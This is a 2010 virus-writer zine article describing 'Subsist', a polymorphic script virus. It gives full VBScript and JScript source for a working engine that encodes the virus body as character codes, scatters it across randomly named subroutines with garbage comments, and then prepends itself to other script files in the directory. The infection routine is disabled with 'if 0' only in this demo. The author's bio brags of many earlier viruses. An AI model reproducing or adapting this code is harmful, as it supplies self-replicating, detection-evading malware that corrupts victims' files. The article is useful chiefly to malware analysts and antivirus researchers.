                        Polymorphism Using Subroutines
                              roy g biv / defjam

                                 -= defjam =-
                                  since 1992
                     bringing you the viruses of tomorrow
                                    today!


Former  DOS/Win16  virus writer, author of several virus  families,  including
Ginger  (see Coderz #1 zine for terrible buggy example, contact me for  better
sources  ;),  and Virus Bulletin 9/95 for a description of what   they  called
Rainbow.   Co-author  of  world's first virus using circular  partition  trick
(Orsam, coded with Prototype in 1993).  Designer of world's first XMS swapping
virus  (John Galt, coded by RT Fishel in 1995, only 30 bytes stub, the rest is
swapped  out).   Author of world's first virus using Thread Local Storage  for
replication  (Shrug, see Virus Bulletin 6/02 for a description, but they  call
it Chiton), world's first virus using Visual Basic 5/6 language extensions for
replication  (OU812), world's first Native executable virus (Chthon),  world's
first  virus  using process co-operation to prevent termination  (Gemini,  see
Virus  Bulletin 9/02 for a description), world's first virus using polymorphic
SMTP  headers (JunkMail, see Virus Bulletin 11/02 for a description),  world's
first viruses that can convert any data files to infectable objects (Pretext),
world's  first  32/64-bit  parasitic  EPO .NET  virus  (Croissant,  see  Virus
Bulletin  11/04  for a description, but they call it Impanate), world's  first
virus  using  self-executing HTML (JunkHTMaiL, see Virus Bulletin 7/03  for  a
description), world's first virus for Win64 on Intel Itanium (Shrug, see Virus
Bulletin 6/04 for a description, but they call it Rugrat), world's first virus
for  Win64 on AMD AMD64 (Shrug), world's first cross-infecting virus for Intel
IA32  and  AMD  AMD64  (Shrug),  world's  first  viruses  that  infect  Office
applications  and  script  files  using the same  code  (Macaroni,  see  Virus
Bulletin  11/05  for  a description, but they call it Macar),  world's   first
viruses  that  can infect both VBS and JScript using the same code (ACDC,  see
Virus  Bulletin 11/05 for a description, but they call it Cada), world's first
virus  that  can  infect  CHM files (Charm, see Virus  Bulletin  10/06  for  a
description,  but they call it Chamb), world's first IDA plugin virus  (Hidan,
see Virus Bulletin 3/07 for a description), world's first viruses that use the
Microsoft  Script  Encoder  to dynamically encrypt the  virus  body  (Screed),
world's  first virus for StarOffice and OpenOffice (Starbucks), world's  first
virus  IDC  virus (ID10TiC), world's first polymorphic virus for Win64 on  AMD
AMD64  (Boundary, see Virus Bulletin 12/06 for a description, but they call it
Bounds),  world's first virus that can infect Intel-format and  PowerPC-format
Mach-O  files  (MachoMan,  see  Virus Bulletin 01/07 for  a  description,  but
they  call  it  Macarena), world's first virus that uses  Unicode  escapes  to
dynamically encrypt the virus body, world's first self-executing PIF (Spiffy),
world's  first  self-executing  LNK (WeakLNK), world's first virus  that  uses
virtual  code  (Relock),  world's  first virus to use  FSAVE  for  instruction
reordering  (Mimix),  world's first virus for ODbgScript (Volly), and  world's
first  Hiew  plugin virus (Hiewg).  Author of various retrovirus articles  (eg
see Vlad #7 for the strings that make your code invisible to TBScan).  Went to
sleep for a number of years.  I am awake now. ;)


What is it?

Most  script viruses that use encryption just carry an encrypted block and try
to  make  the  decryptor  hard  to read.  I decided to  try  something  a  bit
different.  Instead of a single decryptor, there are many. The code is encoded
using numbers, then it is broken into many smaller pieces.  Each of the pieces
is  placed into a subroutine or function.  Each subroutine has a random  name,
and  it is written in random order.  In JScript, the subroutines also accept a
random  number  of  (unused)  parameters.  If subroutine, then  the  block  is
assigned  to  a  variable with random name.  If function, then  the  block  is
returned to a variable with random name.  Each routine requires execution of a
previous  routine in order to concatenate the blocks in the right order.   The
decoding  is  using "chr" (VBScript) or "String.fromCharCode"  (JScript).   To
make more difficult, the decoded script is not constant.  All of the variables
have random names that change each time.


So simple, so what?

It sounds very simple, but it looks really great. :)
There is lots of whitespace and garbage comments.  In JScript, there is also a
trick  with  the tokeniser so that comments can appear between the object  and
the method call.  The variable assignments and subroutines can appear anywhere
in  the code (after the variable is defined), so it is hard to see which lines
execute in which order.  It is hard to describe, you have to see for yourself.
Here is the code in VBScript:

'Subsist - roy g biv 10/3/10
varvirclr=createobject("scripting.filesystemobject").opentextfile("subsist.vbs").readall
virb=instr(varvirclr,"var"+"all")
varvirclr=replace(replace(mid(varvirclr,virb,instr(virb,varvirclr,vbcrlf+"rem")-virb),"if 0 then"+vbcrlf,""),"end if '0"+vbcrlf,"")

rem begin virus
varall=array("varall","vartind1","vartind2","vartval1","vartval2","vartstr1","vartstr2","varind1","varind2","varind3","varfragc","varfrag","varptype","varmode","varsname","varname","varename","varefrag","varatype","varbody","varpmode","varsel","varltr","varnum","varstr","procrandspc","procbool","procrandname","procrandcomm","procrandcomms","procrandcase","procrandcont")
randomize
'replace variable names
'must occur before make fragment count
for vartval1=0to ubound(varall)
  varvirclr=replace(varvirclr,varall(vartval1),procrandname)
next

'array of code fragments
dim varfrag()
vartstr1=varvirclr

'make fragment count
do
  vartval1=int(rnd*20)+20
  if vartval1>len(vartstr1)then vartval1=len(vartstr1)
  redim preserve varfrag(varfragc+1)
  varfrag(varfragc)=vartval1
  varfragc=varfragc+1
  vartstr1=mid(vartstr1,vartval1+1)
loop while len(vartstr1)

'array of sub/function type
dim varptype()
redim varptype(varfragc)
'array of assign/return mode
dim varmode()
redim varmode(varfragc)
'array of sub/function names
dim varsname()
redim varsname(varfragc)
'array of variable names
dim varname()
redim varname(varfragc+1)
'array of emitted variable names
dim varename()
redim varename(varfragc+1)

for varind1=0to varfragc
  'sub or function
  varptype(varind1)=procbool
  'assign or return if function
  varmode(varind1)=int(rnd*varptype(varind1)*2)
  'sub or function name
  varsname(varind1)=procrandname
  'variable name
  varname(varind1+1)=procrandname
  if varmode(varind1)then
    varename(varind1+1)=1
    'two returning functions in a row must share the variable name
    if varind1 then if varmode(varind1-1)then varname(varind1+1)=varname(varind1)
  end if
next

'replace source variable name
'length of this variable name must not change
varvirclr=replace(varvirclr,"varvirclr",varname(varfragc))

'fragment and convert code
for varind1=0to varfragc
  vartval1=varfrag(varind1)
  varfrag(varind1)=""
  for vartind2=1to vartval1
    varfrag(varind1)=varfrag(varind1)+"+"+procrandspc+procrandcase("chr")+procrandspc+"("+procrandspc+cstr(asc(mid(varvirclr,vartind2,1)))+procrandspc+")"+procrandspc
  next
  varfrag(varind1)=procrandcont(mid(varfrag(varind1),2))
  varvirclr=mid(varvirclr,vartval1+1)
next

'first variable name
varname(0)=procrandname

'array of emitted code fragments
dim varefrag()
redim varefrag(varfragc)

varatype=array("sub","function")
do
  'force global scope for variables
  if procbool then
    varind1=int(rnd*(varfragc+1))
    if varename(varind1)=0then
      varename(varind1)=1
      varbody=varbody+vbcrlf+procrandcase(varname(varind1))+procrandspc+"="+procrandspc+chr(34)+chr(34)+procrandcomms
      'cannot concatenate anymore
      varpmode=0
    end if
  end if

  varind1=int(rnd*varfragc)
  if varefrag(varind1)=0then
    varefrag(varind1)=1
    'cannot have "rem" on sub/function open line
    varpmode=varatype(varptype(varind1))
    varbody=varbody+vbcrlf+procrandspc+procrandcase(varpmode)+procrandspc+varsname(varind1)+procrandcomm(0)
    if varmode(varind1)then
      varbody=varbody+varsname(varind1)+procrandspc+"="+procrandspc
    else
      varbody=varbody+procrandcase(varname(varind1+1))+procrandspc+"="+procrandspc+procrandcase(varname(varind1))+procrandspc+"+"+procrandspc
    end if
    varbody=varbody+varfrag(varind1)+procrandcomms+procrandcase("end")+procrandspc+procrandcase(varpmode)+procrandcomms
    varind2=varind2+1
    'cannot concatenate anymore
    varpmode=0
  end if

  'if first required variable was emitted and returning function or second required variable was emitted
  if varind3<varfragc and varename(varind3)and (varmode(varind3)or varename(varind3+1))and procbool then
    if varmode(varind3)then
      'if previous was returning function
      if varpmode then
        'decide randomly to concatenate further
        varpmode=procbool
        'or to start new line
        'cannot have "rem" on sub/function-call line
        if varpmode=0then varbody=varbody+procrandcomm(0)
      end if
      if varpmode=0then
        varpmode=1
        varbody=varbody+procrandcase(varname(varind3+1))+procrandspc+"="+procrandspc+procrandcase(varname(varind3))
      end if
      varbody=varbody+procrandspc+"+"+procrandspc
    elseif varpmode then
      'cannot have "rem" on sub/function-call line
      varbody=varbody+procrandcomm(0)
      varpmode=0
    end if
    varbody=varbody+varsname(varind3)+procrandspc
    'cannot have "rem" on sub/function-call line
    if varmode(varind3)=0then varbody=varbody+procrandcomm(0)
    varind3=varind3+1
  end if
loop while varind2<varfragc or varind3<varfragc

varbody=varbody+procrandcomm(0)+procrandcase("execute")+procrandspc+procrandcase(varname(varfragc))+procrandcomms

if 0 then
on error resume next
set varind1=createobject("scripting.filesystemobject")
set vartind1=varind1.getfolder(".")                             'demo version, current directory only
for each vartind2 in vartind1.files
  if lcase(varind1.getextensionname(vartind2))="vbs"then
    err.clear
    set varind2=varind1.opentextfile(vartind2)      	        'open potential victim
    if err.number=0then
      vartstr1=varind2.read(1)                                  'read first character
      if vartstr1<>"'"then                                      'check for infection marker
        vartstr2=varind2.readall                                'read entire file
        vartval1=vartind2.attributes                            'save attributes
        vartind2.attributes=0                                   'remove any read-only attribute
        err.clear
        set varind3=varind1.opentextfile(vartind2,2)            'open file for writing
        if err.number=0then
          varind3.write "'Subsist - roy g biv 10/3/10"+vbcrlf+varbody+vartstr1+vartstr2
                                                                'prepend to file
          varind3.close                                         'close file (write mode)
        end if
        vartind2.attributes=vartval1                            'restore attributes
      end if
      varind2.close                                             'close file (read mode)
    end if
  end if
next
end if '0

function procrandspc
  procrandspc=string(int(rnd*5)+1," ")
end function

function procrandcomm(varsel)
  vartstr1=""
  for vartind1=0to int(rnd*5)
    if procbool then
      vartstr2="'"
      if varsel then procrandcase("rem")
      vartstr1=vartstr1+procrandspc+vartstr2+procrandspc
      varsel=procbool
      for vartind2=0to int(rnd*5)
        vartstr1=vartstr1+chr(int(rnd*95)+32)
      next
    end if
    vartstr1=vartstr1+procrandspc+vbcrlf+procrandspc
  next
  procrandcomm=vartstr1
end function

function procbool
  procbool=int(rnd*2)
end function

function procrandname
  vartstr1=""
  varltr=1
  varnum=0
  for vartind1=0to 8
    vartstr1=vartstr1+chr((int(rnd*26)+procbool*32+65)*varltr+(int(rnd*10)+48)*varnum)
    varltr=procbool
    varnum=varltr xor 1
  next
  procrandname=vartstr1
end function

function procrandcomms
  procrandcomms=procrandcomm(procbool)
end function

function procrandcase(varstr)
  vartstr2=""
  for vartind1=1to len(varstr)
    vartval2=asc(mid(varstr,vartind1,1))
    vartstr2=vartstr2+chr(vartval2+procbool*32*(vartval2>96))
  next
  procrandcase=vartstr2
end function

function procrandcont(varstr)
  vartstr1=""
  do
    varind2=instr(varstr,"+")
    if varind2 then
      vartstr1=vartstr1+left(varstr,varind2)
      if int(rnd*10)=0then vartstr1=vartstr1+"_"+vbcrlf
      varstr=mid(varstr,varind2+1)
    end if
  loop while varind2
  procrandcont=vartstr1+varstr
end function

rem end virus
execute varbody


Yes, it is quite large.  Here is the code in JScript:

//Subsist - roy g biv 10/3/10
varvirclr=new ActiveXObject("scripting.filesystemobject").opentextfile("subsist.js").readall()
virb=varvirclr.search("var"+"all")
varvirclr=varvirclr.substr(virb,varvirclr.search(/\/\*/)-virb-2).replace(/if\(0\)\r\n|\/\/0\r\n/g,"")

//begin virus
varall=Array("varall","vartind1","vartind2","vartind3","vartval1","vartstr1","vartstr2","varind1","varind2","varind3","varfragc","varfrag","varmode","varsname","varname","varename","varefrag","varbody","varpmode","varsel","varltr","varnum","varstr","procrandspc","procbool","procrandname","procrandcomm","procrandcomms","procrandcont")

//replace variable names
//must occur before make fragment count
for(vartval1=0;vartval1<varall.length;++vartval1)
  varvirclr=varvirclr.replace(RegExp(varall[vartval1],"g"),procrandname())

//array of code fragments
varfrag=Array()
vartstr1=varvirclr
varfragc=0

//make fragment count
with(Math)
{
  do
  {
    vartval1=round(random()*20)+20
    if(vartval1>vartstr1.length)
      vartval1=vartstr1.length
    varfrag[varfragc++]=vartval1
    vartstr1=vartstr1.substr(vartval1)
  }
  while(vartstr1.length)

  //array of assign/return mode
  varmode=Array()
  //array of function names
  varsname=Array()
  //array of variable names
  varname=Array()
  //array of emitted variable names
  varename=Array()

  for(varind1=0;varind1<varfragc;++varind1)
  {
    //assign or return if function
    varmode[varind1]=procbool()
    //function name
    varsname[varind1]=procrandname()
    //variable name
    varname[varind1+1]=procrandname()
    if(varmode[varind1])
    {
      varename[varind1+1]=1
      //two returning functions in a row must share the variable name
      if(varind1)
        if(varmode[varind1-1])
          varname[varind1+1]=varname[varind1]
    }
  }

  //replace source variable name
  //length of this variable name must not change
  varvirclr=varvirclr.replace(/varvirclr/g,varname[varfragc])

  //fragment and convert code
  for(varind1=0;varind1<varfragc;++varind1)
  {
    vartval1=varfrag[varind1]
    varfrag[varind1]=""
    for(vartind2=0;vartind2<vartval1;++vartind2)
      varfrag[varind1]+="+"+procrandcomm(1)+"String"+procrandcomm(1)+"."+procrandcomm(1)+"fromCharCode"+procrandcomm(1)+"("+procrandcomm(1)+varvirclr.charCodeAt(vartind2)+procrandcomm(1)+")"+procrandcomm(1)
    varfrag[varind1]=procrandcont(varfrag[varind1].substr(1))
    varvirclr=varvirclr.substr(vartval1)
  }

  //first variable name
  varname[0]=procrandname()

  //array of emitted code fragments
  varefrag=Array()
  varbody=""
  varind3=0

  do
  {
    //force global scope for variables
    if(procbool()&&!varename[varind1=round(random()*(varfragc+1))])
    {
      varename[varind1]=1
      varbody+="\n"+procrandcomm(1)+varname[varind1]+procrandcomm(1)+"="+procrandcomm(1)+'""'+procrandcomms()
      //cannot concatenate anymore
      varpmode=0
    }

    if(!varefrag[varind1=round(random()*varfragc)])
    {
      varefrag[varind1]=1
      varbody+="\n"+procrandcomm(1)+"function"+procrandcomm(1)+varsname[varind1]+procrandcomm(1)+"("+(procbool()?procrandname():"")+procrandcomm(1)+")"+procrandcomms()+"{"+procrandcomms()
      if(varmode[varind1])
        varbody+="return"+procrandcomm(1)
      else
        varbody+=varname[varind1+1]+procrandcomm(1)+"="+procrandcomm(1)+varname[varind1]+procrandcomm(1)+"+"+procrandcomm(1)
      varbody+=varfrag[varind1]+procrandcomms()+"}"+procrandcomms()
      ++varind2
      //cannot concatenate anymore
      varpmode=0
    }

    //if first required variable was emitted and returning function or second required variable was emitted
    if(varind3<varfragc&&varename[varind3]&&(varmode[varind3]||varename[varind3+1])&&procbool())
    {
      if(varmode[varind3])
      {
        //if previous was returning function
        if(varpmode)
        {
          //decide randomly to concatenate further
          varpmode=procbool()
          //or to start new line
          if(!varpmode)
            varbody+=procrandcomms()
        }
        if(!varpmode)
        {
          varpmode=1
          varbody+=varname[varind3+1]+procrandcomm(1)+"="+procrandcomm(1)+varname[varind3]
        }
        varbody+=procrandcomm(1)+"+"+procrandcomm(1)
      }
      else if(varpmode)
      {
        varbody+=procrandcomms()
        varpmode=0
      }
      varbody+=varsname[varind3]+procrandcomm(1)+"("+procrandcomm(1)+")"+procrandcomm(1)
      if(!varmode[varind3])
        varbody+=procrandcomms()
      ++varind3
    }
  }
  while((varind2<varfragc)||(varind3<varfragc))
}

varbody+=procrandcomms()+"eval"+procrandcomm(1)+"("+procrandcomm(1)+varname[varfragc]+procrandcomm(1)+")"+procrandcomms()

if(0)
try
{
  varind1=new ActiveXObject("scripting.filesystemobject")
  for(vartind1=new Enumerator(varind1.getfolder(".").files);!vartind1.atEnd();vartind1.moveNext())
                                                                //demo version, current directory only
    if(varind1.getextensionname(vartind2=vartind1.item()).toLowerCase()=="js")
      try
      {
        varind2=varind1.opentextfile(vartind2)                  //open potential victim
        vartstr1=varind2.read(1)                                //read first character
        if(vartstr1!="/")                                       //check for infection marker
          try
          {
            vartstr2=varind2.readall()                          //read entire file
            vartval1=vartind2.attributes                        //save attributes
            vartind2.attributes=0                               //remove any read-only attribute
            varind3=varind1.opentextfile(vartind2,2)            //open file for writing
            varind3.write("//Subsist - roy g biv 10/3/10\n"+varbody+vartstr1+vartstr2)
                                                                //prepend to file
            varind3.close()                                     //close file (write mode)
            vartind2.attributes=vartval1                        //restore attributes
          }
          catch(vartval1)
          {
          }
        varind2.close()                                         //close file (read mode)
      }
      catch(vartval1)
      {
      }
}
catch(vartval1)
{
}  
//0

function procrandspc()
{
  varltr=""
  vartind3=0
  while(vartind3++<=Math.random()*5)
    varltr+=" "
  return varltr
}

function procrandcomm(varsel)
{
  vartstr2=" "
  if(procbool())
  {
    vartstr2=procrandspc()+(varsel?"/"+"*":"//")+procrandspc()
    for(vartind3=0;vartind3<=Math.random()*5;++vartind3)
    {
      varltr=String.fromCharCode(Math.random()*95+32)
      if(varltr!="/")
        vartstr2+=varltr
    }
    if(varsel)
       vartstr2+="*/"+procrandspc()
  }
  return vartstr2
}

function procbool()
{
  return Math.round(Math.random())
}

function procrandname()
{
  vartstr1=""
  varltr=1
  varnum=0
  for(vartind1=0;vartind1<9;++vartind1)
  {
    with(Math)
      vartstr1+=String.fromCharCode((random()*26+procbool()*32+65)*varltr+(random()*10+48)*varnum)
    varltr=procbool()
    varnum=varltr^1
  }
  return vartstr1
}

function procrandcomms()
{
  vartstr1=""
  for(vartind1=0;vartind1<=Math.random()*5;++vartind1)
    vartstr1+=procrandcomm(procbool())+procrandspc()+"\n"+procrandspc()
  return vartstr1
}

function procrandcont(varstr)
{
  vartstr1=""
  do
  {
    varind2=varstr.search(/\+/)
    if(varind2>0)
    {
      vartstr1+=varstr.substr(0,varind2+1)
      if(!Math.round(Math.random()*10))
        vartstr1+="\n"
      varstr=varstr.substr(varind2+1)
    }
  }
  while(varind2>0)
  return vartstr1+varstr
}

/* end virus */
eval(varbody)


Greets to friendly people (A-Z):

Active - Benny - herm1t - hh86 - izee - jqwerty - Malum - Obleak - Prototype -
Ratter - Ronin - RT Fishel - sars - SPTH - The Gingerbread Man - Ultras -
uNdErX - Vallez - Vecna - Whitehead


rgb/defjam mar 2010
iam_rgb@hotmail.com
